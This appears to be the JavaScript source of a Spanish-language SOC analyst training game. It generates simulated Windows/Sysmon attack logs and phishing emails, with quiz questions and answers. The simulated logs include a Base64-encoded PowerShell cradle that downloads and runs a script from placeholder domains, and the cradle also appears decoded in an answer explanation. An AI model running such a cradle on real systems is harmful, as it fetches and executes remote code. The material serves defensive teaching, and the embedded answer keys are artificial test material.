"use strict";
// ======================================================================
// NetLab — SOC: investigar alertas con logs de Windows/Sysmon (mini SIEM) y analizar correos de phishing.
// Todo se genera al azar con la respuesta exacta (sin IA), como en un SOC N1 / TryHackMe SAL1.
// ======================================================================
const SOC = { caso: null, tipo: null };
const az = (a) => a[Math.floor(Math.random() * a.length)];
const n2 = (n) => String(n).padStart(2, "0");
const ipExt = () => `${az(["185.220.101", "45.155.205", "103.75.190", "91.240.118", "194.26.29", "77.91.124"])}.${rnd(2, 250)}`;

// ---------------------------------------------------------------- caso de logs de Windows / Sysmon
function casoWindows() {
  const dom = az(["CORP", "ACME", "CONTOSO", "NETLAB"]);
  const victima = az(["jlopez", "mgarcia", "aperez", "srodriguez", "cmartinez", "dhernandez"]);
  const srv = az(["SRV-FILE01", "SRV-WEB02", "DC01", "SRV-APP03"]);
  const pc = `WS-${az(["FIN", "RH", "VENTAS", "TI"])}-${rnd(10, 99)}`;
  const atac = ipExt(), interna = `10.10.${rnd(1, 20)}.${rnd(2, 250)}`;
  const malo = az(["svch0st.exe", "update_helper.exe", "WinDefendr.exe", "msupd.exe", "rundl132.exe"]);
  const url = `http://${az(["cdn-update", "files-sync", "secure-docs", "ms-telemetry"])}.${az(["xyz", "top", "click", "ru"])}/${az(["a", "p", "x"])}${rnd(1, 9)}.ps1`;
  const tarea = az(["OneDriveSync", "GoogleUpdaterTask", "AdobeFlashUpd", "WindowsHealthCheck"]);
  const nuevo = az(["support", "helpdesk2", "svc_backup", "adm1n"]);
  const enc = btoa(String.fromCharCode(...[...`IEX (New-Object Net.WebClient).DownloadString('${url}')`].flatMap((c) => [c.charCodeAt(0), 0])));
  const fallos = rnd(25, 90);
  let t = new Date(2026, 10, rnd(1, 28), rnd(1, 4), rnd(0, 50), 0);
  const ev = [], tick = (s) => { t = new Date(t.getTime() + s * 1000); return `${t.getFullYear()}-${n2(t.getMonth() + 1)}-${n2(t.getDate())} ${n2(t.getHours())}:${n2(t.getMinutes())}:${n2(t.getSeconds())}`; };
  const E = (id, campos) => ev.push({ hora: tick(rnd(1, 20)), id, ...campos });
  // ruido normal
  for (let k = 0; k < 12; k++) E(az([4624, 4634, 4688]), { equipo: az([pc, srv]), usuario: az(["SYSTEM", "jlopez", "mgarcia", "backup_svc"]), ip: k % 3 ? interna : "-", tipo: az([2, 3, 5]), proceso: az(["svchost.exe", "explorer.exe", "chrome.exe", "outlook.exe"]), detalle: "actividad normal" });
  // 1) fuerza bruta RDP
  for (let k = 0; k < fallos; k++) E(4625, { equipo: srv, usuario: az([victima, "administrator", "admin", "test"]), ip: atac, tipo: 10, proceso: "-", detalle: "Logon fallido (0xC000006A contraseña incorrecta)" });
  const exito = tick(rnd(5, 40)); ev.push({ hora: exito, id: 4624, equipo: srv, usuario: `${dom}\\${victima}`, ip: atac, tipo: 10, proceso: "-", detalle: "Logon exitoso (RemoteInteractive / RDP)" });
  // 2) ejecución: PowerShell codificado (Sysmon 1 + 4688)
  E(1, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "powershell.exe", detalle: `CommandLine: powershell.exe -nop -w hidden -enc ${enc}` });
  E(3, { equipo: srv, usuario: `${dom}\\${victima}`, ip: url.split("/")[2], tipo: "-", proceso: "powershell.exe", detalle: `Conexión de red a ${url.split("/")[2]}:80` });
  E(11, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "powershell.exe", detalle: `Archivo creado: C:\\Users\\Public\\${malo}` });
  E(1, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: malo, detalle: `CommandLine: C:\\Users\\Public\\${malo}` });
  // 3) credenciales: acceso a LSASS
  E(10, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: malo, detalle: "ProcessAccess: TargetImage C:\\Windows\\System32\\lsass.exe GrantedAccess 0x1010" });
  // 4) persistencia: tarea programada + usuario nuevo admin
  E(4698, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "schtasks.exe", detalle: `Tarea programada creada: \\${tarea} → C:\\Users\\Public\\${malo}` });
  E(4720, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "net.exe", detalle: `Cuenta creada: ${nuevo}` });
  E(4732, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "net.exe", detalle: `${nuevo} agregado al grupo Administrators` });
  // 5) anti-forense
  E(1102, { equipo: srv, usuario: `${dom}\\${victima}`, ip: "-", tipo: "-", proceso: "wevtutil.exe", detalle: "El registro de auditoría (Security) fue borrado" });
  for (let k = 0; k < 6; k++) E(az([4624, 4688]), { equipo: pc, usuario: "mgarcia", ip: interna, tipo: 2, proceso: az(["teams.exe", "excel.exe"]), detalle: "actividad normal" });
  ev.sort((a, b) => a.hora.localeCompare(b.hora));
  const preguntas = [
    { q: "¿Qué IP externa atacó por fuerza bruta?", r: atac, e: `Filtra id=4625: ${fallos} fallos desde ${atac}.` },
    { q: "¿Qué cuenta logró entrar? (solo el usuario, sin dominio)", r: victima, e: `El 4624 tipo 10 (RDP) desde ${atac} es de ${dom}\\${victima}.` },
    { q: "¿A qué hora (HH:MM:SS) fue el inicio de sesión exitoso del atacante?", r: exito.slice(11), e: `id=4624 con ip=${atac}: ${exito}.` },
    { q: "Decodifica el PowerShell -enc: ¿de qué dominio descargó el script?", r: url.split("/")[2], e: `-enc es Base64 de UTF-16LE. Decodificado: IEX (New-Object Net.WebClient).DownloadString('${url}'). En CyberChef: From Base64 → Decode text UTF-16LE.` },
    { q: "¿Cómo se llama el ejecutable malicioso que quedó en C:\\Users\\Public?", r: malo, e: `Sysmon 11 (FileCreate) por powershell.exe y luego Sysmon 1 lo ejecuta: ${malo}. Ojo con nombres que imitan a los de Windows.` },
    { q: "¿Qué técnica de ATT&CK representa el Sysmon 10 hacia lsass.exe? (ID, ej. T1234.001)", r: "T1003.001", e: "Leer la memoria de LSASS es OS Credential Dumping: LSASS Memory (T1003.001)." },
    { q: "¿Qué nombre tiene la tarea programada de persistencia?", r: tarea, e: `Event 4698 (tarea creada): \\${tarea}. ATT&CK T1053.005.` },
    { q: "¿Qué cuenta nueva agregó a Administrators?", r: nuevo, e: `4720 (cuenta creada) + 4732 (agregada a grupo local de seguridad): ${nuevo}.` },
    { q: "¿Qué Event ID indica que borró el log de seguridad?", r: "1102", e: "1102 = The audit log was cleared. Siempre es una alerta alta." },
  ];
  return { tipo: "windows", titulo: `Alerta: múltiples fallos de inicio de sesión en ${srv}`, eventos: ev, preguntas };
}

// ---------------------------------------------------------------- caso de phishing
function casoPhishing() {
  const empresa = az(["acme.com.mx", "contoso.mx", "netlab.mx", "grupoalfa.com"]);
  const legit = Math.random() < 0.3;
  const marca = az([["Microsoft 365", "microsoft.com"], ["DHL Express", "dhl.com"], ["PayPal", "paypal.com"], ["Banorte", "banorte.com"], ["DocuSign", "docusign.net"]]);
  const parecido = marca[1].replace(/o/, "0").replace(/\.com$|\.net$/, az([".co", "-secure.com", "-verify.net", ".support"]));
  const remitente = legit ? marca[1] : parecido;
  const ip = legit ? `40.${rnd(90, 110)}.${rnd(1, 250)}.${rnd(1, 250)}` : ipExt();
  const malLink = legit ? `https://www.${marca[1]}/account` : `http://${az(["login", "secure", "verify"])}-${marca[1].split(".")[0]}.${az(["xyz", "top", "info"])}/${az(["auth", "s", "go"])}?id=${rnd(1000, 9999)}`;
  const adj = legit ? null : az([`Factura_${rnd(1000, 9999)}.pdf.exe`, `Guia_Envio.html`, `Documento.docm`, `Pago.zip`]);
  const spf = legit ? "pass" : az(["fail", "softfail"]), dkim = legit ? "pass" : az(["fail", "none"]), dmarc = legit ? "pass" : "fail";
  const ret = legit ? `bounce@${marca[1]}` : `${az(["info", "noreply", "admin"])}@${az(["mailer-host.ru", "smtp-free.top", "bulk-sender.xyz"])}`;
  const correo = `Return-Path: <${ret}>
Received: from ${legit ? "mail-" + rnd(10, 99) + "." + marca[1] : "vps" + rnd(100, 999) + ".hosting-barato.net"} (${ip}) by mx.${empresa}
Authentication-Results: mx.${empresa}; spf=${spf} smtp.mailfrom=${ret.split("@")[1]}; dkim=${dkim}; dmarc=${dmarc} header.from=${remitente}
From: "${marca[0]}" <no-reply@${remitente}>
Reply-To: ${legit ? `no-reply@${marca[1]}` : `soporte.${marca[1].split(".")[0]}@${az(["gmail.com", "outlook.com", "proton.me"])}`}
To: ${az(["jlopez", "mgarcia", "finanzas"])}@${empresa}
Subject: ${legit ? `Tu resumen mensual de ${marca[0]}` : az(["⚠️ Acción requerida: tu cuenta será suspendida en 24 h", "Paquete retenido: confirma tu dirección", "Pago rechazado - verifica tus datos", "Tienes un documento pendiente de firma"])}

Hola,
${legit ? `Te compartimos tu resumen del mes. Puedes revisarlo en tu cuenta.` : `Detectamos actividad inusual. Para evitar el bloqueo, verifica tu información de inmediato.`}

[ Ingresar a mi cuenta ](${malLink})
${adj ? `\nAdjunto: ${adj}` : ""}
— Equipo de ${marca[0]}`;
  const preguntas = [
    { q: "¿Es phishing? (si / no)", r: legit ? "no" : "si", e: legit ? "SPF, DKIM y DMARC pasan, el dominio es el real y el enlace va al dominio oficial: es legítimo." : `Dominio parecido (${remitente}), autenticación fallida, urgencia y enlace a otro dominio: phishing.` },
    { q: "¿Qué resultado tuvo DMARC? (pass / fail)", r: dmarc, e: `Lo dice Authentication-Results: dmarc=${dmarc}.` },
    { q: "¿A qué dominio lleva el botón de verdad? (sin http ni ruta)", r: malLink.split("/")[2], e: `El texto del botón no importa: lo que cuenta es el href → ${malLink.split("/")[2]}.` },
    { q: "¿Qué dominio aparece en el Return-Path (el remitente real del sobre)?", r: ret.split("@")[1], e: `Return-Path: <${ret}> — el que de verdad envió el correo.` },
  ];
  if (adj) preguntas.push({ q: "El adjunto, ¿es de riesgo? (si / no)", r: "si", e: `${adj}: ${/\.exe$/.test(adj) ? "doble extensión, en realidad es un ejecutable" : /\.html$/.test(adj) ? "HTML que abre un formulario falso local" : /\.docm$/.test(adj) ? "documento con macros" : "un zip puede esconder ejecutables"}.` });
  return { tipo: "phishing", titulo: `Reporte de usuario: "${correo.match(/^Subject: (.*)$/m)[1]}"`, correo, preguntas };
}

// ---------------------------------------------------------------- interfaz
function pintarSoc() {
  $("#socVista").innerHTML = `<div class="ws-grid">
      <button class="ws-esc" data-soc="windows"><b>🪟 Investigar logs de Windows / Sysmon</b><span class="sub">Fuerza bruta → ejecución → credenciales → persistencia → anti-forense. Filtra como en un SIEM.</span></button>
      <button class="ws-esc" data-soc="phishing"><b>🎣 Analizar un correo reportado</b><span class="sub">Cabeceras, SPF/DKIM/DMARC, enlaces y adjuntos. A veces es legítimo.</span></button>
      <button class="ws-esc" data-soc="ransomware"><b>💀 Ransomware en una estación</b><span class="sub">Macro → PowerShell → borrado de instantáneas → cifrado masivo. Reconstruye la cadena con Sysmon.</span></button>
      <button class="ws-esc" data-soc="c2"><b>📡 Malware que llama a casa (C2)</b><span class="sub">Logs del proxy: encuentra el beaconing, el equipo infectado y la exfiltración.</span></button>
      <button class="ws-esc" data-soc="insider"><b>🕵️ Amenaza interna</b><span class="sub">Un empleado que renunció se lleva datos: accesos fuera de horario, USB y nube personal.</span></button>
      <button class="ws-esc" data-soc="nube"><b>☁️ Cuenta de Microsoft 365 comprometida</b><span class="sub">Entra ID y Exchange: MFA fatigue, reglas de bandeja, reenvío externo y fraude.</span></button>
    </div><div id="socCaso"></div><div id="socRuta"></div>`;
  $$("[data-soc]").forEach((b) => b.addEventListener("click", () => { SOC.caso = SOC_CASOS[b.dataset.soc](); pintarCasoSoc(); }));
  pintarRutaSoc();
}

/** Ruta SOC N1 (estilo TryHackMe SAL1): teoría, examen por tema y jefe por nivel, como Linux y Wireshark. */
const RUTA_SOC = [
  { nombre: "Básico", icono: "🌱", temas: [["soc_triage", "Triage de alertas y falsos positivos", "windows"], ["soc_windows", "Logs de Windows y Sysmon", "windows"],
    ["soc_phishing", "Análisis de phishing", "phishing"], ["soc_siem", "Búsquedas en un SIEM", "siem"]] },
  { nombre: "Intermedio", icono: "⚙️", temas: [["soc_red", "Tráfico sospechoso en la red", "siem"], ["soc_mitre", "MITRE ATT&CK y Cyber Kill Chain", "windows"],
    ["soc_ir", "Respuesta a incidentes (NIST SP 800-61)", "windows"], ["soc_cti", "Inteligencia de amenazas e IOCs", "phishing"]] },
  { nombre: "Avanzado", icono: "🔥", temas: [["soc_ransomware", "Ransomware: detección y respuesta", "ransomware"], ["soc_c2", "Malware y comando y control (C2)", "c2"],
    ["soc_insider", "Amenaza interna y fuga de datos", "insider"], ["soc_nube", "Cuentas de nube comprometidas (Entra ID / M365)", "nube"]] },
  { nombre: "Experto", icono: "🏴", temas: [["soc_web", "Ataques web en el access.log", "rvb_web"], ["soc_ad", "Ataques a Active Directory", "rvb_ad"]] },
];
async function pintarRutaSoc() {
  const caja = $("#socRuta");
  if (!caja) return;
  const prog = await progresoGeneral();
  const txt = { windows: "🪟 Caso de Windows", phishing: "🎣 Caso de phishing", siem: "🛰️ Caso en el SIEM", ransomware: "💀 Caso de ransomware", c2: "📡 Caso de C2",
    insider: "🕵️ Caso de amenaza interna", nube: "☁️ Caso de Microsoft 365", rvb_web: "🕸️ Red vs Blue Web", rvb_ad: "🏢 Red vs Blue AD" };
  const niveles = RUTA_SOC.map((n) => ({ ...n, temas: n.temas.map(([id, nombre, prac]) => ({ id, nombre, prac, practica_txt: txt[prac], detalle: "teoría + examen + caso real" })) }));
  pintarRuta2({ caja, pref: "soc", dominio: "soc", titulo: "Analista SOC nivel 1", cert: "TryHackMe SAL1", niveles,
    onPractica: (t) => {
      if (t.prac === "siem") return ir("siem");
      if (t.prac.startsWith("rvb_")) { RB.modo = t.prac.slice(4); return ir("rvb"); }
      SOC.caso = SOC_CASOS[t.prac]();
      pintarCasoSoc();
      $("#socCaso").scrollIntoView({ behavior: "smooth" });
    } }, prog);
}

function pintarCasoSoc() {
  const c = SOC.caso, caja = $("#socCaso");
  const tabla = !!c.eventos, cols = c.columnas || [["hora", "Hora"], ["id", "ID"], ["equipo", "Equipo"], ["usuario", "Usuario"], ["ip", "IP"], ["tipo", "Tipo"], ["proceso", "Proceso"], ["detalle", "Detalle"]];
  const info = SOC_INFO[c.tipo] || {};
  caja.innerHTML = `<div class="tarjeta destacada"><div class="sub">${c.tipo === "windows" ? "SIEM · Windows Security + Sysmon" : info.sub || "Buzón de phishing"}</div>
    <h2 style="margin:4px 0">${esc(c.titulo)}</h2>
    <div class="acciones" style="margin:6px 0 10px"><button class="primario btn-teofondo" id="socTeoFondo">📖 Teoría a fondo</button>
      <button id="socTeoLec">📚 Lecciones y exámenes de SOC</button></div>
    <div id="socTeoFondoCaja" hidden></div>
    ${tabla ? `
      <div class="fila-filtro"><input class="mono" id="socQ" placeholder="Filtro: ${cols[1][0]}=…  ${cols[2][0]}=…  texto libre (varios separados por espacio)"><button class="chico" id="socLimpiar">Limpiar</button></div>
      <div class="sub" id="socN"></div>
      <div class="soc-tabla"><table class="tabla"><thead><tr>${cols.map(([, n]) => `<th>${esc(n)}</th>`).join("")}</tr></thead><tbody id="socFilas"></tbody></table></div>
      ${["windows", "ransomware", "insider"].includes(c.tipo) ? `<details class="sub"><summary>Chuleta de Event IDs</summary>4624 login ok · 4625 login fallido · 4634 logoff · 4688 proceso creado · 4698 tarea programada · 4720 cuenta creada · 4732 agregado a grupo · 1102 log borrado · Sysmon 1 proceso · 3 red · 10 acceso a proceso · 11 archivo creado · Tipo de logon 2 local, 3 red, 10 RDP · 4663 acceso a objeto · 6416 dispositivo externo nuevo</details>` : ""}`
    : `<pre class="ac-pre soc-correo" data-no-tr>${esc(c.correo)}</pre>`}
    <h3>Preguntas del ticket</h3>
    ${c.preguntas.map((p, i) => `<div class="pregunta"><div><b>${i + 1}.</b> ${esc(p.q)}</div><input class="mono" data-soc-r="${i}" autocomplete="off" spellcheck="false"><div class="expl"></div></div>`).join("")}
    <div class="acciones"><button class="primario" id="socCal">Cerrar el ticket (calificar)</button><button id="socOtro">Otro caso</button></div><div id="socRes"></div></div>`;
  if (tabla) {
    const filtra = () => {
      const terms = $("#socQ").value.trim().toLowerCase().split(/\s+/).filter(Boolean);
      const ok = c.eventos.filter((e) => terms.every((t) => {
        const m = t.match(/^(\w+)=(.*)$/);
        if (m && m[1] in e) return String(e[m[1]]).toLowerCase().includes(m[2]);
        return Object.values(e).join(" ").toLowerCase().includes(t);
      }));
      $("#socN").textContent = `${ok.length} de ${c.eventos.length} eventos`;
      $("#socFilas").innerHTML = ok.map((e) => `<tr class="${c.tipo === "windows" && [1102, 4720, 4732, 4698, 10].includes(e.id) ? "soc-alto" : ""}">${cols.map(([k]) =>
        k === "id" ? `<td><b>${esc(e[k])}</b></td>` : `<td${["detalle", "url", "ua", "destino"].includes(k) ? ' class="mono" data-no-tr' : ""}>${esc(e[k])}</td>`).join("")}</tr>`).join("");
    };
    $("#socQ").addEventListener("input", filtra);
    $("#socLimpiar").addEventListener("click", () => { $("#socQ").value = ""; filtra(); });
    filtra();
  }
  $("#socTeoFondo").addEventListener("click", (ev) => teoriaAFondo(ev.target, $("#socTeoFondoCaja"), {
    clave: `soc:${c.tipo}`, mundo: "soc", titulo: info.titulo || (c.tipo === "windows" ? "Investigar un incidente con logs de Windows (Security + Sysmon)" : "Analizar un correo de phishing"),
    contexto: info.contexto || (c.tipo === "windows"
      ? "Ticket de analista SOC nivel 1: se filtran eventos de Windows Security y Sysmon (4624, 4625, 4688, 4698, 4720, 4732, 1102; Sysmon 1, 3, 10, 11; tipos de logon) para reconstruir un ataque y mapearlo a técnicas de MITRE ATT&CK."
      : "Ticket de analista SOC nivel 1: se analizan las cabeceras y el cuerpo de un correo (SPF, DKIM, DMARC, Return-Path, Received, enlaces y adjuntos) para decidir si es phishing y qué indicadores reportar.") }));
  $("#socTeoLec").addEventListener("click", () => irTeoria("soc", null));
  $("#socOtro").addEventListener("click", () => { SOC.caso = SOC_CASOS[c.tipo](); pintarCasoSoc(); });
  $("#socCal").addEventListener("click", async () => {
    let buenas = 0;
    c.preguntas.forEach((p, i) => {
      const v = $(`[data-soc-r="${i}"]`).value.trim().toLowerCase().replace(/^s[ií]$/, "si"), ok = [p.r, ...(p.alt || [])].some((x) => v === String(x).toLowerCase());
      buenas += ok;
      $(`[data-soc-r="${i}"]`).nextElementSibling.innerHTML = `<span class="${ok ? "ok-txt" : "error"}">${ok ? "✓" : `✗ Era: ${esc(p.r)}`}</span> <span class="sub">${esc(p.e)}</span>`;
    });
    const nota = Math.round((100 * buenas) / c.preguntas.length) / 10, est = nota >= 10 ? 3 : nota >= 8 ? 2 : nota >= 6 ? 1 : 0;
    if (est) {
      const hoy = new Date().toISOString().slice(0, 10).replace(/-/g, "");
      await api("/api/academia/resultado", { id: `soc_${c.tipo}_${hoy}`, estrellas: est }).catch(() => {});
      refrescarJugador(true);
    }
    // al cuaderno de errores solo lo que sirve fuera de este caso (Event IDs, técnicas de ATT&CK)
    c.preguntas.filter((p, i) => /^(T\d{4}(\.\d{3})?|\d{3,4})$/i.test(p.r) && $(`[data-soc-r="${i}"]`).value.trim().toLowerCase() !== String(p.r).toLowerCase()).forEach((p) =>
      api("/api/repaso/agregar", { area: "SOC", tipo: "texto", clave: "soc:" + p.q.slice(0, 60), datos: { enunciado: p.q, respuesta: String(p.r), explicacion: p.e } }).catch(() => {}));
    $("#socRes").innerHTML = `<div class="tarjeta ${est ? "ac-ok" : "ac-error"}"><b>${buenas}/${c.preguntas.length} · ${nota}/10 ${"★".repeat(est)}</b>
      <div class="sub">${est === 3 ? "Ticket perfecto. Así trabaja un analista N1." : "Revisa las explicaciones; lo que fallaste va a tu cuaderno de errores."}</div></div>`;
  });
}
